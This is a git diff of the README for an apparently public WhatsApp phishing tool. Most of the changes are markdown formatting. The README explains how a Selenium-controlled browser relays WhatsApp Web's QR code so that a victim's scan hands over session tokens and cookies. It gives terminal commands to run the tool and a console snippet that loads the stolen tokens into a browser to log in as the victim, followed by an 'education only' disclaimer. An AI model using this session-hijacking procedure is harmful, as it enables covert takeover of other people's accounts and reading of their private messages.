@@ -22,7 +22,7 @@ The program starts a http and a socket.io server. If a new client connects to so
 
 If the QR code gets scanned Whatsapp will authenticate the selenium controlled browser and store some tokens in the localStorage and document.cookie. We extract that data and save it into a text file. It will look like so:
 
-```json
+```
 {
    "s":{
       "remember-me":"true",
@@ -53,19 +53,19 @@ If the QR code gets scanned Whatsapp will authenticate the selenium controlled b
 
 You can than import these tokens into your browser and log in as the person who scanned the QR code.
 
-## Instructions
+##Instructions
 
    * Download the [selenium standalone server](http://www.seleniumhq.org/download/) jar file and install Firefox if you don't already have it.
    * Type the following into your terminal
    
-   ```console
-   java -jar selenium-server.jar
-   # new terminal
-   git clone https://github.com/Mawalu/whatsapp-phishing.git
-   cd whatsapp-phishing
-   npm install
-   node index.js
-   ```
+    ```
+    $ java -jar selenium-server.jar
+    $ # new terminal
+    $ git clone https://github.com/Mawalu/whatsapp-phishing.git
+    $ cd whatsapp-phishing
+    $ npm install
+    $ node index.js
+    ```
    * Open your browser and go to [http://localhost:8080](http://localhost:8080)
    * Start Whatsapp on your smartphone, go to Menu > Whatsapp Web and scan the QR code from your browser.
    * Copy the content from the newly created secrets file
@@ -73,7 +73,7 @@ You can than import these tokens into your browser and log in as the person who 
    * Open your developer console
    * Enter the following code:
    
-   ```javascript
+   ```
    > var t = CONTENT_OF_YOUR_SECRETS_FILE
    > function login(token) {Object.keys(token.s).forEach(function (key) {localStorage.setItem(key, token.s[key])}); token.c = token.c.split(';'); token.c.forEach(function(cookie) {document.cookie = cookie; });}
    > login(t)
@@ -81,6 +81,6 @@ You can than import these tokens into your browser and log in as the person who 
    * Reload the page
    * You should be logged in as the person who scanned the QR code
 
-## Disclaimer
+##Disclaimer
 
 Whatsapp messages are meant to be private. Just because the NSA reads everything it doesn't mean you should do as well! Everything in this repo is for education purpose only and I am not responsible if you use it otherwise.
